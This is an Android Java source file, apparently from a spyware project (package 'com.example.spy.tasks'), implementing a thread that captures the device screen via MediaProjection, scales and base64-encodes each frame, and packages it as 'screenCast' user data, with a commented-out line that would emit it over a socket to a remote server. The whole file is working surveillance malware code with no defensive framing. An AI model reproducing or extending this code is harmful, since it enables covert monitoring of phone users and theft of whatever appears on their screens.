package com.example.spy.tasks;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.ImageFormat;
import android.hardware.display.DisplayManager;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.SystemClock;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

public class TakeScreenShot2 extends Thread {
    boolean flagStop = false;
    Context ctx;
    Handler handler;
    int resultCode;
    Intent data;
    public TakeScreenShot2(Context ctx, Handler handler, int resultCode, Intent data){
        this.ctx = ctx;
        this.handler = handler;
        this.resultCode = resultCode;
        this.data = data;
    }

    private void takeScreenShot() {

        SystemClock.sleep(1000);

        DisplayMetrics metrics = new DisplayMetrics();
        WindowManager windowManager = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
        MediaProjectionManager mgr = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
            mgr = (MediaProjectionManager) ctx.getSystemService(Activity.MEDIA_PROJECTION_SERVICE);

            windowManager.getDefaultDisplay().getMetrics(metrics);
            MediaProjection mMediaProjection = mgr.getMediaProjection(resultCode, data);
            ImageReader imgReader = ImageReader.newInstance(metrics.widthPixels, metrics.heightPixels, ImageFormat.JPEG, 2);


            ImageReader.OnImageAvailableListener onImageAvailableListener = reader -> {
                SystemClock.sleep(100);
                Image image = reader.acquireLatestImage();

                if (image != null) {

                    int mWidth = image.getWidth();
                    int mHeight = image.getHeight();

                    Image.Plane[] planes = image.getPlanes();
                    ByteBuffer buffer = planes[0].getBuffer();
                    int pixelStride = planes[0].getPixelStride();
                    int rowStride = planes[0].getRowStride();
                    int rowPadding = rowStride - pixelStride * mWidth;


                    Bitmap bitmap = Bitmap.createBitmap(mWidth + rowPadding / pixelStride, mHeight, Bitmap.Config.ARGB_8888);
                    bitmap.copyPixelsFromBuffer(buffer);

                    JSONObject obj = new JSONObject();
                    try {
                        obj.put("name", "ScreenCast");
                        obj.put("image64", encodeImage(Bitmap.createScaledBitmap(bitmap, 480, 800, true)));
                        obj.put("dataType", "screenCast");
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    //Constants.socket ?.emit("usrData", obj)

                }

                image.close();
            };

            mMediaProjection.createVirtualDisplay("ScreenCapture", metrics.widthPixels, metrics.heightPixels,
                    metrics.densityDpi, DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imgReader.getSurface(), null, handler);

            imgReader.setOnImageAvailableListener(onImageAvailableListener, handler);

            if (flagStop){
                mMediaProjection.stop();
                imgReader.setOnImageAvailableListener(null, null);
            }
        }
    }

    private String encodeImage(Bitmap bm) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        bm.compress(Bitmap.CompressFormat.JPEG, 100, baos);
        byte[] b = baos.toByteArray();
        return Base64.encodeToString(b, Base64.DEFAULT);
    }

    @Override
    public void run() {
        super.run();

        takeScreenShot();
    }
}
